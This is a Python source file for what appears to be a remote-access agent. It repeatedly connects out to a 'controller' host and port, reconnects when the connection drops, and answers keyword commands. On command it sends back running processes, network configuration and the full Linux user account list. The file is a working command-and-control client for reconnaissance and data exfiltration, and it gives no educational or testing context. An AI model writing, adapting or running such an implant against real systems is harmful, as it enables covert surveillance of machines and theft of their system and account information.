import psutil
import socket
import sys
import time
import netifaces
import argparse

if sys.platform.startswith('linux'):
    # linux only
    import pwd


class Enumerate:
    @staticmethod
    def get_processes():
        """
        Gets running processes' ID, name, cpu usage and memory usage.

            Returns:
                return_statement (str): Running processes
        """
        return_statement = ""
        processes = psutil.process_iter()  # get list of running processes

        # iterate through list
        for process in processes:
            try:
                pid = process.pid  # get process ID
                process_name = process.name()  # get process name

                cpu_usage = process.cpu_percent()  # get CPU usage
                memory_usage = process.memory_info().rss / 1048576  # get memory usage in megabytes (from bytes --> MB)

                # append information to return statement
                return_statement += f"Process Name: {process_name}, PID: {pid}, CPU Usage: {cpu_usage}%," \
                                    f" Memory Usage: {memory_usage}\n"
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                # Ignore errors
                pass
        return return_statement

    @staticmethod
    def get_local_ip():
        """
        Gets the local IP of the device by creating a socket and reading the IP used for that socket.

            Returns:
                local_ip (str): private IP of machine
        """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
            s.connect(('1.1.1.1', 80))  # connect to remote host (cloudfare dns)
            local_ip = s.getsockname()[0]  # get ip from socket
            s.close()  # close socket
        except socket.timeout:
            # host is unreachable
            local_ip = "Failed. Socket timeout."
        except socket.error:
            # socket blocked
            local_ip = "Failed. Socket error"
        return local_ip

    @staticmethod
    def get_subnet_mask():
        """
        Gets the subnet mask from interface

            Returns:
                addr_info['netmask'] (str): Subnet mask of interface
        """
        ifaces = netifaces.interfaces()  # get network interfaces
        for iface in ifaces:
            iface_addresses = netifaces.ifaddresses(iface)  # get addresses associated with interface
            if netifaces.AF_INET in iface_addresses:  # if it contains an ipv4 address
                addr_info = iface_addresses[netifaces.AF_INET][0]  # get first ipv4 in list
                if 'netmask' in addr_info:
                    return addr_info['netmask']  # return subnet mask

    @staticmethod
    def get_interfaces():
        """
        Returns all network interfaces on a machine, including the default interface.

            Returns:
                return_statement (str): Interfaces
        """
        return_statement = ""
        ifaces = netifaces.interfaces()  # get interfaces

        gateway_addresses = netifaces.gateways()  # get gateway addresses
        if netifaces.AF_INET in gateway_addresses['default']:  # if it is default gateway
            default_interface = gateway_addresses['default'][netifaces.AF_INET][1]  # store interface as default

        for iface in ifaces:
            if iface == default_interface:
                return_statement += f"{iface} (default)\n"
            else:
                return_statement += f"{iface}\n"
        return return_statement

    @staticmethod
    def get_default_gateway():
        """
        Returns the default gateway.

            Returns:
                gateway_address (str): The default gateway
        """
        gateway_addresses = netifaces.gateways()  # get gateway addresses
        if 'default' in gateway_addresses and netifaces.AF_INET in gateway_addresses['default']:  # if there is a
            # default route entry
            return gateway_addresses['default'][netifaces.AF_INET][0]  # return the first address

    def get_network_info(self):
        """
        Calls the other network functions to gain information about the network configuration on the machine.

        The results of these functions are formatted and error checks are performed.

            Returns:
                data (str): Network information
        """
        try:
            data = ""
            data += f"Network Interfaces: \n{self.get_interfaces()}\n"  # get interfaces on local machine
            data += f"Local IP: {self.get_local_ip()}\n"  # get local ip of machine
            data += f"Subnet Mask: {self.get_subnet_mask()}\n"  # get subnet mask of network
            data += f"Default Gateway: {self.get_default_gateway()}\n"  # get default gateway of machine
        except OSError:
            # no internet connection to reach 1.1.1.1
            data = "\nFailed due to connection\n"
        except UnboundLocalError:
            # No interfaces available
            data = "\nNo interfaces available\n"
        return data

    @staticmethod
    def get_users():
        """
        Get User information, including Name, UID, GID, home directory and default shell (linux only).

            Returns:
                users (str): user information
        """
        if sys.platform.startswith('linux'):
            try:
                users = ""
                for user in pwd.getpwall():
                    users += f"{user.pw_name}: UID: {user.pw_uid}, GID: {user.pw_gid}, Dir: {user.pw_dir}, Shell: " \
                             f"{user.pw_shell}\n"
            except Exception as error:
                users = error
        else:
            users = "\nLinux only operation.\n"
        return users


class Shell(Enumerate):
    def __init__(self, ip, port, buffer):
        self.ip = ip
        self.port = port
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        """
        Attempt to connect to controller, waiting between requests to avoid dossing.

        the receive() function is called once a connection is established.
        """
        while True:
            try:
                time.sleep(2.5)  # sleep to avoid flooding requests
                self.socket.connect((self.ip, self.port))  # connect to controller
                self.receive()  # receive data
            except ConnectionRefusedError:
                # Connection refused, retry
                continue
            except KeyboardInterrupt:
                self.socket.close()
                sys.exit(0)

    def receive(self):
        """
        Continuously receive commands from the controller.

        Commands are executed once received. If the connection is lost, the socket is closed and the __init__() is
        called to make a new socket. The connect() function is then called to re-establish connection to the controller.
        """
        try:
            while True:
                command = self.socket.recv(self.buffer).decode("utf-8")

                if not command:
                    # Lost connection with server, attempt to re-establish connection
                    self.socket.close()  # close socket
                    self.__init__(self.ip, self.port, self.buffer)  # recreate socket
                    self.connect()  # attempt to reconnect

                if 'terminate' in command:
                    self.socket.close()
                    sys.exit(0)
                elif 'get_processes' in command:
                    result = self.get_processes()
                    self.send(result)
                elif 'get_network' in command:
                    result = self.get_network_info()
                    self.send(result)
                elif 'get_users' in command:
                    result = self.get_users()
                    self.send(result)
                else:
                    pass

        except KeyboardInterrupt:
            self.socket.close()
            sys.exit(0)
        except ConnectionResetError:
            # Lost connection with server, attempt to re-establish connection
            self.socket.close()  # close socket
            self.__init__(self.ip, self.port, self.buffer)  # recreate socket
            self.connect()  # attempt to reconnect

    def send(self, message):
        """
        Encode and send a message to the controller

            Parameter:
                message (str): message to be sent to controller
        """
        self.socket.sendall(bytes(message, "utf-8"))


def take_args():
    """
    Parse args on the command line to get the ip and port of the controller.

    Default values are localhost:1234.

        Returns:
            args (argparse.Namespace) Arguments passed on the command line

    """
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip", "-a", type=str, help="IP address of controller", default="127.0.0.1")
    parser.add_argument("--port", "-p", type=int, help="Port of controller", default=1234)
    return parser.parse_args()


if __name__ == '__main__':
    args = take_args()
    shell = Shell(args.ip, args.port, 2048)
    shell.connect()

